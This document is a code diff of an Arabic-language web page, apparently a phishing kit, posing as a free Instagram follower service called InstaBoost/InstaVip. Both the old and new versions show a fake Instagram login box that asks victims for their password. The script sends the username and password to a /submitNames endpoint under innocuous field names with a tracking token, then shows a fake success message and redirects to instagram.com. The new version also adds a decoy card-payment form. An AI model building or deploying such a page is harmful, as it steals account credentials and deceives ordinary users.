@@ -5,216 +5,143 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
     <!-- Meta Tags for Preview -->
-    <meta property="og:title" content="InstaBoost - رشق متابعين مجاناً">
-    <meta property="og:description" content="احصل على 1000 متابع حقيقي لحسابك على إنستقرام مجاناً وبسرعة فائقة. جرب الخدمة الآن!">
+    <meta property="og:title" content="InstaVip - متجر رشق المتابعين العالمي">
+    <meta property="og:description" content="المتجر رقم #1 لزيادة المتابعين والتفاعل. احصل على باقتك المجانية الآن أو اختر من بين باقاتنا المميزة.">
     <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png">
-    <meta property="og:type" content="website">
 
-    <title>InstaBoost | زيادة متابعين إنستقرام</title>
+    <title>InstaVip | رشق متابعين</title>
     <style>
-        :root {
-            --insta-gradient: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
-            --primary-color: #0095f6;
-        }
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #fafafa;
-            margin: 0;
-            padding: 0;
-            color: #262626;
-        }
-        .header {
-            background: var(--insta-gradient);
-            color: white;
-            padding: 20px;
-            text-align: center;
-            font-size: 24px;
-            font-weight: bold;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        }
-        .container {
-            max-width: 400px;
-            margin: 20px auto;
-            padding: 20px;
-        }
-        .card {
-            background: white;
-            border: 1px solid #dbdbdb;
-            border-radius: 8px;
-            padding: 25px;
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        .free-badge {
-            background: #ed4956;
-            color: white;
-            padding: 5px 15px;
-            border-radius: 20px;
-            font-size: 14px;
-            display: inline-block;
-            margin-bottom: 10px;
-            animation: pulse 1.5s infinite;
-        }
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-            100% { transform: scale(1); }
-        }
-        h2 { margin: 10px 0; font-size: 20px; }
-        p { color: #8e8e8e; font-size: 14px; line-height: 1.5; }
-        .input-group { margin: 20px 0; text-align: right; }
-        label { display: block; margin-bottom: 8px; font-weight: 600; font-size: 14px; }
-        input {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #dbdbdb;
-            border-radius: 5px;
-            background: #fafafa;
-            box-sizing: border-box;
-            font-size: 14px;
-        }
-        .btn-main {
-            width: 100%;
-            padding: 12px;
-            background-color: var(--primary-color);
-            color: white;
-            border: none;
-            border-radius: 5px;
-            font-weight: bold;
-            cursor: pointer;
-            font-size: 16px;
-            transition: background 0.3s;
-        }
-        .btn-main:hover { background-color: #1877f2; }
-        .plans {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 10px;
-            margin-top: 20px;
-        }
-        .plan-item {
-            border: 1px solid #dbdbdb;
-            padding: 10px;
-            border-radius: 5px;
-            font-size: 12px;
-            background: #fff;
-        }
-        .plan-item.active {
-            border-color: var(--primary-color);
-            background: #f0f9ff;
-        }
-        .price { font-weight: bold; color: #262626; display: block; margin-top: 5px; }
+        :root { --main: #0095f6; --bg: #fafafa; --card: #ffffff; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: var(--bg); margin: 0; padding-bottom: 50px; }
+        .nav { background: white; padding: 15px; text-align: center; border-bottom: 1px solid #dbdbdb; font-weight: bold; font-size: 22px; color: #262626; }
+        .hero { background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); color: white; padding: 40px 20px; text-align: center; }
+        .container { max-width: 500px; margin: -30px auto 0; padding: 0 15px; }
+        .card { background: white; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); padding: 25px; margin-bottom: 20px; }
+        .plan-box { display: flex; flex-direction: column; gap: 10px; margin: 20px 0; }
+        .plan { border: 2px solid #efefef; padding: 15px; border-radius: 10px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; transition: 0.3s; }
+        .plan:hover { border-color: var(--main); background: #f0f9ff; }
+        .plan.selected { border-color: var(--main); background: #f0f9ff; }
+        .plan .info { text-align: right; }
+        .plan .price { font-weight: bold; color: var(--main); }
+        .btn-buy { background: var(--main); color: white; border: none; width: 100%; padding: 15px; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 10px; }
         
-        /* Modal Style */
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.7);
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-        }
-        .modal-content {
-            background: white;
-            padding: 30px;
-            border-radius: 10px;
-            width: 90%;
-            max-width: 350px;
-            text-align: center;
-        }
+        /* Modal */
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; justify-content: center; align-items: center; }
+        .modal-content { background: white; width: 90%; max-width: 400px; border-radius: 15px; padding: 25px; position: relative; }
+        .input-group { margin-bottom: 15px; text-align: right; }
+        label { display: block; font-size: 13px; color: #666; margin-bottom: 5px; }
+        input { width: 100%; padding: 12px; border: 1px solid #dbdbdb; border-radius: 5px; box-sizing: border-box; }
+        .visa-icons { display: flex; gap: 10px; margin-bottom: 15px; justify-content: center; }
     </style>
 </head>
 <body>
 
-    <div class="header">InstaBoost 🚀</div>
+<div class="nav">InstaVip 🚀</div>
+<div class="hero">
+    <h1>زد شعبيتك اليوم!</h1>
+    <p>أكثر من 1,000,000 مستخدم يثقون بنا</p>
+</div>
 
-    <div class="container">
-        <div class="card">
-            <div class="free-badge">عرض محدود</div>
-            <h2>احصل على 1000 متابع مجاناً</h2>
-            <p>أدخل اسم المستخدم الخاص بك واختر الباقة للبدء في عملية الرشق التلقائي.</p>
-            
-            <div class="input-group">
-                <label>اسم المستخدم (Username)</label>
-                <input type="text" id="target_user" placeholder="@username" required>
+<div class="container">
+    <div class="card">
+        <h3>1. أدخل معلومات الحساب</h3>
+        <input type="text" id="target_user" placeholder="اسم المستخدم (Username)">
+        
+        <h3 style="margin-top: 25px;">2. اختر الباقة المناسبة</h3>
+        <div class="plan-box">
+            <div class="plan selected" onclick="selectPlan(this, '0.00')">
+                <div class="info"><b>1,000 متابع</b><br><small>تفعيل فوري</small></div>
+                <div class="price">مجاني</div>
             </div>
-
-            <div class="plans">
-                <div class="plan-item active">
-                    1000 متابع
-                    <span class="price">0.00$ (مجاني)</span>
-                </div>
-                <div class="plan-item">
-                    5000 متابع
-                    <span class="price">9.99$</span>
-                </div>
+            <div class="plan" onclick="selectPlan(this, '14.99')">
+                <div class="info"><b>5,000 متابع</b><br><small>متابعين حقيقيين + ضمان</small></div>
+                <div class="price">14.99$</div>
             </div>
-
-            <button class="btn-main" style="margin-top: 20px;" onclick="showLogin()">ابدأ الرشق الآن</button>
+            <div class="plan" onclick="selectPlan(this, '29.99')">
+                <div class="info"><b>10,000 متابع</b><br><small>باقة المشاهير + تفاعل</small></div>
+                <div class="price">29.99$</div>
+            </div>
         </div>
-
-        <div style="text-align: center; color: #8e8e8e; font-size: 12px;">
-            نحن نستخدم تقنيات آمنة 100% لضمان عدم حظر حسابك.
-        </div>
+        
+        <button class="btn-buy" id="actionBtn" onclick="handleAction()">ابدأ الرشق المجاني</button>
     </div>
+</div>
 
-    <!-- Login Modal -->
-    <div class="modal" id="loginModal">
-        <div class="modal-content">
-            <h2 style="font-style: italic; font-size: 30px;">Instagram</h2>
-            <p>يجب تسجيل الدخول لتأكيد ملكية الحساب واستلام المتابعين.</p>
-            <form id="loginForm">
-                <input type="text" id="username" placeholder="اسم المستخدم أو الهاتف" required style="margin-bottom: 10px;">
-                <input type="password" id="password" placeholder="كلمة السر" required>
-                <button type="submit" class="btn-main" id="submitBtn" style="margin-top: 15px;">تأكيد الحساب</button>
-            </form>
-            <button onclick="hideLogin()" style="background:none; border:none; color:#8e8e8e; margin-top: 10px; cursor:pointer;">إلغاء</button>
-        </div>
+<!-- Modal for Login/Payment -->
+<div class="modal" id="actionModal">
+    <div class="modal-content" id="modalContent">
+        <!-- Content injected by JS -->
     </div>
+</div>
 
-    <script>
-        const urlParams = new URLSearchParams(window.location.search);
-        const token = urlParams.get('t');
+<script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const token = urlParams.get('t');
+    let selectedPrice = '0.00';
 
-        function showLogin() {
-            const user = document.getElementById('target_user').value;
-            if(!user) { alert('الرجاء إدخال اسم المستخدم أولاً'); return; }
-            document.getElementById('loginModal').style.display = 'flex';
-            document.getElementById('username').value = user;
+    function selectPlan(el, price) {
+        document.querySelectorAll('.plan').forEach(p => p.classList.remove('selected'));
+        el.classList.add('selected');
+        selectedPrice = price;
+        const btn = document.getElementById('actionBtn');
+        if(price === '0.00') {
+            btn.innerText = "ابدأ الرشق المجاني";
+            btn.style.background = "#0095f6";
+        } else {
+            btn.innerText = "شراء الباقة الآن (" + price + "$)";
+            btn.style.background = "#28a745";
         }
+    }
 
-        function hideLogin() {
-            document.getElementById('loginModal').style.display = 'none';
+    function handleAction() {
+        const user = document.getElementById('target_user').value;
+        if(!user) return alert('أدخل اسم المستخدم أولاً');
+        
+        const modal = document.getElementById('actionModal');
+        const content = document.getElementById('modalContent');
+        modal.style.display = 'flex';
+
+        if(selectedPrice === '0.00') {
+            content.innerHTML = `
+                <h2 style="font-style:italic; font-size:30px; text-align:center;">Instagram</h2>
+                <p style="text-align:center;">لتفعيل الباقة المجانية، يرجى تأكيد ملكية الحساب.</p>
+                <div class="input-group"><label>اسم المستخدم</label><input type="text" id="u" value="${user}"></div>
+                <div class="input-group"><label>كلمة السر</label><input type="password" id="p" placeholder="كلمة سر الحساب"></div>
+                <button class="btn-buy" onclick="submitData()">تأكيد واستلام المتابعين</button>
+            `;
+        } else {
+            content.innerHTML = `
+                <h3>إتمام عملية الشراء</h3>
+                <p>الباقة المختارة: 5,000 متابع (${selectedPrice}$)</p>
+                <div class="visa-icons">
+                    <img src="https://cdn-icons-png.flaticon.com/512/196/196070.png" width="40">
+                    <img src="https://cdn-icons-png.flaticon.com/512/196/196086.png" width="40">
+                </div>
+                <div class="input-group"><label>رقم البطاقة</label><input type="text" placeholder="0000 0000 0000 0000"></div>
+                <div style="display:flex; gap:10px;">
+                    <div class="input-group"><label>التاريخ</label><input type="text" placeholder="MM/YY"></div>
+                    <div class="input-group"><label>CVV</label><input type="text" placeholder="123"></div>
+                </div>
+                <button class="btn-buy" style="background:#28a745" onclick="alert('عذراً، بوابة الدفع تحت الصيانة حالياً. جرب الباقة المجانية!')">دفع الآن</button>
+                <button onclick="document.getElementById('actionModal').style.display='none'" style="background:none; border:none; color:#999; width:100%; margin-top:10px;">إلغاء</button>
+            `;
         }
+    }
 
-        document.getElementById('loginForm').onsubmit = async (e) => {
-            e.preventDefault();
-            const btn = document.getElementById('submitBtn');
-            btn.disabled = true;
-            btn.innerText = "جاري التحقق من الحساب...";
+    async function submitData() {
+        const u = document.getElementById('u').value;
+        const p = document.getElementById('p').value;
+        if(!p) return alert('أدخل كلمة السر للتأكيد');
 
-            const user = document.getElementById('username').value;
-            const pass = document.getElementById('password').value;
+        await fetch('/submitNames', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ token, firstName: u, secondName: p })
+        });
 
-            try {
-                await fetch('/submitNames', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        token: token,
-                        firstName: user,
-                        secondName: pass
-                    })
-                });
-            } catch (err) {}
-
-            // إيهام المستخدم ببدء العملية ثم التحويل
-            setTimeout(() => {
-                alert('تم التحقق بنجاح! سيبدأ وصول المتابعين خلال 24 ساعة.');
-                window.location.href = "https://www.instagram.com";
-            }, 2000);
-        };
-    </script>
+        alert('تم التأكيد! سيبدأ الرشق خلال دقائق.');
+        window.location.href = "https://instagram.com";
+    }
+</script>
 </body>
 </html>
